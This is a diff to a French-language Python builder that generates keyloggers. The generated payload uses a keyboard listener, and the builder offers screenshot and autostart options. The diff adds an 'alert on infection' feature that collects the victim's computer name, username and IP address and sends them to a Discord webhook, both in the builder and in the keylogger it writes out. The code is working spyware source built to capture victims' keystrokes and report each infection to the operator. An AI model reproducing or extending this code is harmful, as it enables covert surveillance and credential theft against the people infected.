@@ -13,14 +13,19 @@ import threading
 from PIL import ImageGrab
 import io
 import cx_Freeze
+import platform
+import getpass
+import socket
 
-
+ordi = platform.uname()
 
 
 historique = []
 capture_apres_at = False
 apres_at_buffer = []
 compteur = 0
+
+hostname = socket.gethostname()
 
 ctk.set_appearance_mode("Dark")
 ctk.set_default_color_theme("dark-blue")
@@ -156,11 +161,15 @@ def low_and_slow_option_func():
 
 def alert_on_infection_option_func():
     discord_webhook = webhook_entry.get()
-    if discord_webhook.strip() == "":
-        messagebox.showerror("Erreur", "Le webhook Discord ne peut pas être vide pour cette option.")
-        return
-    message = {"content": "Alerte : Une contamination a été détectée sur le système infecté."}
-    requests.post(discord_webhook, json=message)
+    name = (
+        f"Nom de l'ordinateur : {ordi.node}"
+        f"Utilisateur actuel : {getpass.getuser()}"
+        f"Nom de l'ordinateur : {ordi.node}"
+        f"Adresse IP : {socket.gethostbyname(hostname)}"
+        )
+
+    requests.post(discord_webhook, json={"content": name})
+    
 
 def test_webhook():
     test = webhook_entry.get().strip()
@@ -278,8 +287,26 @@ def pyw():
             f.write("    with keyboard.Listener(on_press=touche) as listener:\n")
             f.write("        listener.join()\n\n")
 
+        # Alerte si infection
+        # Alerte si infection
+        if config["options"]["alert_on_infection"]:
+            f.write(
+                'import getpass, platform, socket, requests\n'
+                'ordi = platform.node()\n'
+                'hostname = socket.gethostname()\n\n'
+                'def alert_on_infection_option_func():\n'
+                '    discord_webhook = WEBHOOK\n'
+                '    name = (\n'
+                '        f"Nom de l\'ordinateur : {ordi}\\n"\n'
+                '        f"Utilisateur actuel : {getpass.getuser()}\\n"\n'
+                '        f"Adresse IP : {socket.gethostbyname(hostname)}"\n'
+                '    )\n'
+                '    requests.post(discord_webhook, json={"content": name})\n\n'
+            )
+
+
         # Autres options (fonction vide)
-        for opt in ["autostart", "activity_time", "low_and_slow", "alert_on_infection"]:
+        for opt in ["autostart", "activity_time", "low_and_slow"]:
             if config["options"][opt]:
                 f.write(f"def {opt}_option_func():\n")
                 f.write(f"    print('Option {opt} activée')\n\n")
@@ -382,7 +409,7 @@ def text():
 jsp = ctk.StringVar(value=".msi")
 
 # Cases à cocher
-choix_nom = ctk.CTkCheckBox(app, text="Choix du nom du keylogs (Obligatoire)", variable=choix_nom_var, command=nom_keylogs)
+choix_nom = ctk.CTkCheckBox(app, text="Choix du nom du keylogs", variable=choix_nom_var, command=nom_keylogs)
 choix_nom.pack(pady=5)
 screenshot_option = ctk.CTkCheckBox(app, text="Capture d'écran", variable=screenshot_var)
 screenshot_option.pack(pady=5)
@@ -396,7 +423,7 @@ capture_before_after_at_option = ctk.CTkCheckBox(app, text="Capture avant @ et a
 capture_before_after_at_option.pack(pady=5)
 low_and_slow_option = ctk.CTkCheckBox(app, text="Low and Slow (En développement)", variable=low_slow_var)
 low_and_slow_option.pack(pady=5)
-alert_on_infection_option = ctk.CTkCheckBox(app, text="Alerte si contamination (En développement)", variable=alert_var, command=alert_on_infection_option_func)
+alert_on_infection_option = ctk.CTkCheckBox(app, text="Alerte si contamination", variable=alert_var)
 alert_on_infection_option.pack(pady=5)
 switch = ctk.CTkSwitch(app, textvariable=jsp, command=text)
 switch.pack()
@@ -409,5 +436,3 @@ lancer_btn.pack(pady=20)
 
 def key():
     app.mainloop()
-
-key()
